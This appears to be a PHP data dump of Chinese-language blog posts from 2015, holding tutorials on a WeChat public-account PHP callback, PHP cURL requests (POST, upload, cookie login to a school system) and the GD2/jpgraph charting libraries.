&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ToUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/ToUserName&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;FromUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/FromUserName&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;CreateTime&gt;%s&lt;/CreateTime&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;MsgType&gt;&lt;![CDATA[%s]]&gt;&lt;/MsgType&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Content&gt;&lt;![CDATA[%s]]&gt;&lt;/Content&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;FuncFlag&gt;0&lt;/FuncFlag&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xml&gt;&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!empty(&nbsp;$keyword&nbsp;))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$msgType&nbsp;=&nbsp;&quot;text&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$contentStr&nbsp;=&nbsp;&quot;Welcome&nbsp;to&nbsp;wechat&nbsp;world!&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$resultStr&nbsp;=&nbsp;sprintf($textTpl,&nbsp;$fromUsername,&nbsp;$toUsername,&nbsp;$time,&nbsp;$msgType,&nbsp;$contentStr);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$resultStr;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Input&nbsp;something...&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;function&nbsp;checkSignature()
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$signature&nbsp;=&nbsp;$_GET[&quot;signature&quot;];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$timestamp&nbsp;=&nbsp;$_GET[&quot;timestamp&quot;];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$nonce&nbsp;=&nbsp;$_GET[&quot;nonce&quot;];&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$token&nbsp;=&nbsp;TOKEN;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmpArr&nbsp;=&nbsp;array($token,&nbsp;$timestamp,&nbsp;$nonce);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sort($tmpArr);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmpStr&nbsp;=&nbsp;implode(&nbsp;$tmpArr&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmpStr&nbsp;=&nbsp;sha1(&nbsp;$tmpStr&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(&nbsp;$tmpStr&nbsp;==&nbsp;$signature&nbsp;){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
}

?&gt;</pre><p><br/></p><p>3.mp.weixin.qq.com/debug/cgi-bin/sandboxinfo?action=showinfo&amp;t=sandbox/index</p><p>　关注公众号，查看用户列表信息</p><p><img src=\\"/public/upload/image/20150921/1442814905292745.jpg\\" title=\\"1442814905292745.jpg\\" alt=\\"161551076383380.jpg\\"/></p><p><br/></p><p>教程：http://blog.csdn.net/dongsg11200/article/details/22046583<br/></p>',
            'keyword' => '微信,公众,平台,PHP',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:28:34',
          ),
          40 => 
          array (
            'id' => '45',
            'uid' => '1',
            'title' => 'php curl配置以及使用',
            'content' => '<pre class=\\"brush:php;toolbar:false\\">配置方法：

php_curl.dll
libeay32.dll
ssleay32.dll

php5ts.dll

复制到&nbsp;%windir%/system32&nbsp;以及php&nbsp;目录的ext目录&nbsp;下
并且找到php.ini（phpinfo里显示的那个php.ini文件）
　　修改了extension=php_curl.dll&nbsp;并把前面的分号去掉
还重起了APACHE&nbsp;/&nbsp;IIS
这些DLL&nbsp;5.2.4PHP版本可以在这里找&nbsp;下载

&nbsp;
参考地址：http://www.blueidea.com/tech/program/2010/7348.asp&nbsp;

实用方法：

&nbsp;&nbsp;1：简单使用
&nbsp;&nbsp;//&nbsp;1.&nbsp;初始化
&nbsp;&nbsp;$ch&nbsp;=&nbsp;curl_init();
&nbsp;&nbsp;//&nbsp;2.&nbsp;设置选项，包括URL
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_URL,&nbsp;&quot;http://www.163.com&quot;);//http://localhost:7020/del.php?menu=test
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HEADER,&nbsp;0);
&nbsp;&nbsp;//&nbsp;3.&nbsp;执行并获取HTML文档内容
&nbsp;&nbsp;$output&nbsp;=&nbsp;curl_exec($ch);
&nbsp;&nbsp;
&nbsp;&nbsp;echo&nbsp;$output;
&nbsp;&nbsp;
&nbsp;&nbsp;if&nbsp;($output&nbsp;===&nbsp;FALSE)&nbsp;{
&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;cURL&nbsp;Error:&nbsp;&quot;&nbsp;.&nbsp;curl_error($ch);//检测错误
&nbsp;&nbsp;}
&nbsp;&nbsp;//打印抓取信息数组
&nbsp;&nbsp;$info&nbsp;=&nbsp;curl_getinfo($ch);
&nbsp;&nbsp;foreach($info&nbsp;as&nbsp;$a=&gt;$b)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;echo&nbsp;$a.&quot;--&quot;.$b.&quot;&lt;br/&gt;&quot;;
&nbsp;&nbsp;}
&nbsp;&nbsp;//&nbsp;4.&nbsp;释放curl句柄
&nbsp;&nbsp;curl_close($ch);
&nbsp;&nbsp;

2：修改heade头

//修改header头
&nbsp;&nbsp;//&nbsp;测试用的URL
&nbsp;&nbsp;&nbsp;$urls&nbsp;=&nbsp;array(
&nbsp;&nbsp;&nbsp;&nbsp;&quot;http://www.cnn.com&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&quot;http://www.mozilla.com&quot;
&nbsp;&nbsp;&nbsp;);
&nbsp;&nbsp;&nbsp;//,&quot;http://www.facebook.com&quot;
&nbsp;&nbsp;&nbsp;//&nbsp;测试用的浏览器信息
&nbsp;&nbsp;&nbsp;$browsers&nbsp;=&nbsp;array(
&nbsp;&nbsp;&nbsp;&nbsp;&quot;standard&quot;&nbsp;=&gt;&nbsp;array&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;user_agent&quot;&nbsp;=&gt;&nbsp;&quot;Mozilla/5.0&nbsp;(Windows;&nbsp;U;&nbsp;Windows&nbsp;NT&nbsp;6.1;&nbsp;en-US;&nbsp;rv:1.9.1.6)&nbsp;Gecko/20091201&nbsp;Firefox/3.5.6&nbsp;(.NET&nbsp;CLR&nbsp;3.5.30729)&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;language&quot;&nbsp;=&gt;&nbsp;&quot;en-us,en;q=0.5&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),
&nbsp;&nbsp;&nbsp;&nbsp;&quot;iphone&quot;&nbsp;=&gt;&nbsp;array&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;user_agent&quot;&nbsp;=&gt;&nbsp;&quot;Mozilla/5.0&nbsp;(iPhone;&nbsp;U;&nbsp;CPU&nbsp;like&nbsp;Mac&nbsp;OS&nbsp;X;&nbsp;en)&nbsp;AppleWebKit/420+&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Version/3.0&nbsp;Mobile/1A537a&nbsp;Safari/419.3&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;language&quot;&nbsp;=&gt;&nbsp;&quot;en&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),
&nbsp;&nbsp;&nbsp;&nbsp;&quot;french&quot;&nbsp;=&gt;&nbsp;array&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;user_agent&quot;&nbsp;=&gt;&nbsp;&quot;Mozilla/4.0&nbsp;(compatible;&nbsp;MSIE&nbsp;7.0;&nbsp;Windows&nbsp;NT&nbsp;5.1;&nbsp;GTB6;&nbsp;.NET&nbsp;CLR&nbsp;2.0.50727)&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;language&quot;&nbsp;=&gt;&nbsp;&quot;fr,fr-FR;q=0.5&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)
&nbsp;&nbsp;&nbsp;);
&nbsp;&nbsp;&nbsp;foreach&nbsp;($urls&nbsp;as&nbsp;$url)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;URL:&nbsp;$url&lt;br/&gt;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($browsers&nbsp;as&nbsp;$test_name&nbsp;=&gt;&nbsp;$browser)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ch&nbsp;=&nbsp;curl_init();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;设置&nbsp;url
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_URL,&nbsp;$url);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;设置浏览器的特定header
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HTTPHEADER,&nbsp;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;User-Agent:&nbsp;{$browser[&#39;user_agent&#39;]}&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Accept-Language:&nbsp;{$browser[&#39;language&#39;]}&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;页面内容我们并不需要
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_NOBODY,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;只需返回HTTP&nbsp;header
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HEADER,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;返回结果，而不是输出它
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$output&nbsp;=&nbsp;curl_exec($ch);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_close($ch);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;有重定向的HTTP头信息吗?
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(preg_match(&quot;!Location:&nbsp;(.*)!&quot;,&nbsp;$output,&nbsp;$matches))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;$test_name:&nbsp;redirects&nbsp;to&nbsp;$matches[1]&lt;br/&gt;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;$test_name:&nbsp;no&nbsp;redirection&lt;br/&gt;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;\\\\n\\\\n&quot;;
&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;
&nbsp;&nbsp;
&nbsp;&nbsp;3：POST数据
&nbsp;&nbsp;$url&nbsp;=&nbsp;&quot;http://localhost:7020/del.php?menu=getpost&quot;;
&nbsp;&nbsp;$post_data&nbsp;=&nbsp;array&nbsp;(
&nbsp;&nbsp;&nbsp;&quot;foo&quot;&nbsp;=&gt;&nbsp;&quot;bar&quot;,
&nbsp;&nbsp;&nbsp;&quot;query&quot;&nbsp;=&gt;&nbsp;&quot;Nettuts&quot;,
&nbsp;&nbsp;&nbsp;&quot;action&quot;&nbsp;=&gt;&nbsp;&quot;Submit&quot;
&nbsp;&nbsp;);
&nbsp;&nbsp;$ch&nbsp;=&nbsp;curl_init();
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_URL,&nbsp;$url);
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);
&nbsp;&nbsp;//&nbsp;我们在POST数据哦！
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POST,&nbsp;1);
&nbsp;&nbsp;//&nbsp;把post的变量加上
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POSTFIELDS,&nbsp;$post_data);
&nbsp;&nbsp;$output&nbsp;=&nbsp;curl_exec($ch);
&nbsp;&nbsp;curl_close($ch);
&nbsp;&nbsp;echo&nbsp;$output;


&nbsp;&nbsp;
&nbsp;&nbsp;4：文件上传
&nbsp;&nbsp;$url&nbsp;=&nbsp;&quot;http://localhost:7020/del.php?menu=getfile&quot;;
&nbsp;&nbsp;$post_data&nbsp;=&nbsp;array&nbsp;(
&nbsp;&nbsp;&nbsp;&quot;foo&quot;&nbsp;=&gt;&nbsp;&quot;bar&quot;,
&nbsp;&nbsp;&nbsp;//&nbsp;要上传的本地文件地址
&nbsp;&nbsp;&nbsp;&quot;upload&quot;&nbsp;=&gt;&nbsp;&quot;@C:/1.txt&quot;
&nbsp;&nbsp;);
&nbsp;&nbsp;$ch&nbsp;=&nbsp;curl_init();
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_URL,&nbsp;$url);
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POST,&nbsp;1);
&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POSTFIELDS,&nbsp;$post_data);
&nbsp;&nbsp;$output&nbsp;=&nbsp;curl_exec($ch);
&nbsp;&nbsp;curl_close($ch);
&nbsp;&nbsp;echo&nbsp;$output;
&nbsp;&nbsp;
&nbsp;&nbsp;
&nbsp;&nbsp;5：同时处理多个curl
&nbsp;&nbsp;//&nbsp;创建两个cURL资源
&nbsp;&nbsp;$ch1&nbsp;=&nbsp;curl_init();
&nbsp;&nbsp;$ch2&nbsp;=&nbsp;curl_init();
&nbsp;&nbsp;//&nbsp;指定URL和适当的参数
&nbsp;&nbsp;curl_setopt($ch1,&nbsp;CURLOPT_URL,&nbsp;&quot;http://www.baidu.com&quot;);
&nbsp;&nbsp;curl_setopt($ch1,&nbsp;CURLOPT_HEADER,&nbsp;0);
&nbsp;&nbsp;curl_setopt($ch2,&nbsp;CURLOPT_URL,&nbsp;&quot;http://www.php.net/&quot;);
&nbsp;&nbsp;curl_setopt($ch2,&nbsp;CURLOPT_HEADER,&nbsp;0);
&nbsp;&nbsp;//&nbsp;创建cURL批处理句柄
&nbsp;&nbsp;$mh&nbsp;=&nbsp;curl_multi_init();
&nbsp;&nbsp;//&nbsp;加上前面两个资源句柄
&nbsp;&nbsp;curl_multi_add_handle($mh,$ch1);
&nbsp;&nbsp;curl_multi_add_handle($mh,$ch2);
&nbsp;&nbsp;//&nbsp;预定义一个状态变量
&nbsp;&nbsp;$active&nbsp;=&nbsp;null;
&nbsp;&nbsp;//&nbsp;执行批处理
&nbsp;&nbsp;do&nbsp;{
&nbsp;&nbsp;&nbsp;$mrc&nbsp;=&nbsp;curl_multi_exec($mh,&nbsp;$active);
&nbsp;&nbsp;}&nbsp;while&nbsp;($mrc&nbsp;==&nbsp;CURLM_CALL_MULTI_PERFORM);
&nbsp;&nbsp;while&nbsp;($active&nbsp;&amp;&amp;&nbsp;$mrc&nbsp;==&nbsp;CURLM_OK)&nbsp;{
&nbsp;&nbsp;&nbsp;if&nbsp;(curl_multi_select($mh)&nbsp;!=&nbsp;-1)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;do&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mrc&nbsp;=&nbsp;curl_multi_exec($mh,&nbsp;$active);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;while&nbsp;($mrc&nbsp;==&nbsp;CURLM_CALL_MULTI_PERFORM);
&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
&nbsp;&nbsp;//&nbsp;关闭各个句柄
&nbsp;&nbsp;curl_multi_remove_handle($mh,&nbsp;$ch1);
&nbsp;&nbsp;curl_multi_remove_handle($mh,&nbsp;$ch2);
&nbsp;&nbsp;curl_multi_close($mh);
&nbsp;&nbsp;
&nbsp;&nbsp;
&nbsp;&nbsp;
&nbsp;&nbsp;6：模拟登录
&nbsp;&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;vlogin($url,$request){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cookie_jar&nbsp;=&nbsp;tempnam(&#39;./tmp&#39;,&#39;cookie&#39;);//在当前目录下生成一个随机文件名的临时文件
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ch&nbsp;=&nbsp;curl_init($url);&nbsp;//初始化curl模块
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HEADER,&nbsp;0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POST,&nbsp;1);//post方式提交
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POSTFIELDS,&nbsp;$request);//要提交的内容
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//把返回$cookie_jar来的cookie信息保存在$cookie_jar文件中
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_COOKIEJAR,&nbsp;$cookie_jar);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$xianshi=curl_exec&nbsp;($ch);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_close($ch);&nbsp;//get&nbsp;data&nbsp;after&nbsp;login
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$curl=&quot;http://jwc.ecjtu.jx.cn/mis_o/query.php&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ch=curl_init($curl);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HEADER,&nbsp;0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POST,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POSTFIELDS,&nbsp;&quot;StuID=20102110130309&amp;Term=2012.1&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_COOKIEFILE,&nbsp;$cookie_jar);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$xianshi=curl_exec($ch);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_close($ch);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$xianshi;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$url=&quot;http://jwc.ecjtu.jx.cn/mis_o/login.php&quot;;//这个是我们学校教务处的网站，也就是我要爬的网站地址文件。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$request=&quot;user=用户名&amp;pass=密码&amp;Submit=提交&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;vlogin($url,&nbsp;$request)</pre><p><br/></p>',
            'keyword' => 'php,curl',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:27:40',
          ),
          41 => 
          array (
            'id' => '44',
            'uid' => '1',
            'title' => 'GD2类库与jpgraph类库',
            'content' => '<p><strong>1.在php中加载GD库</strong></p><p>　　打开PHP.ini，定位到extension=php_gd2.dll，把前面的分号删掉；重启apache。</p><p><br/></p><p><strong>2.Jpgraph的安装与配置</strong></p><p>　　安装：从官网下载：http://www.aditus.nu/jpgraph/，</p><p>　　将压缩包解压到一个文件夹中，如 D:\\\\xampp\\\\php\\\\pearjpgraph\\\\。</p><p>　　打开php.ini文件，并修改其中的include_path=&quot;.;D:\\\\xampp\\\\php\\\\PEAR;D:\\\\xampp\\\\php\\\\pear\\\\jpgraph&quot;，重启apache。</p><p>　　支持中文的配置：Jpgraph支持的中文标准字体可以通过修改jpg_config.inc.php文件中的CHINESE_TTF_FONT的设置来完成，DEFINE(&#39;CHINESE_TTF_FONT&#39;,&#39;bkai00mp.ttf&#39;);</p><p><br/></p><p><strong>3.创建简单的图像：在GD2函数库中创建画布，可以通过imagecreate()函数实现</strong></p><pre class=\\"brush:php;toolbar:false\\">&lt;?php&nbsp;

//&nbsp;content=&quot;text/plain;&nbsp;charset=utf-8&quot;
require_once&nbsp;(&#39;jpgraph/jpgraph.php&#39;);
require_once&nbsp;(&#39;jpgraph/jpgraph_line.php&#39;);
&nbsp;
//&nbsp;输入的数据
$ydata&nbsp;=&nbsp;array(11,3,8,12,5,1,9,13,5,7);
&nbsp;
//&nbsp;创建图形
$graph&nbsp;=&nbsp;new&nbsp;Graph(350,250);
$graph-&gt;SetScale(&#39;textlin&#39;);
&nbsp;
//&nbsp;创建折线图
$lineplot=new&nbsp;LinePlot($ydata);
$lineplot-&gt;SetColor(&#39;blue&#39;);
&nbsp;
//&nbsp;在图上创建测量点
$graph-&gt;Add($lineplot);
&nbsp;
//&nbsp;显示图形
$graph-&gt;Stroke();
?&gt;</pre><p><br/></p>',
            'keyword' => 'GD2,jpgraph',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:26:51',
          ),
          42 => 
          array (
            'id' => '43',
            'uid' => '1',
            'title' => 'PHP图片的二进制转换为数据流',
            'content' => '<pre class=\\"brush:php;toolbar:false\\">&lt;?php
//echo&nbsp;fread(fopen($realfilename,&#39;rb&#39;);这样输出一个图片&nbsp;你看看是什么内容

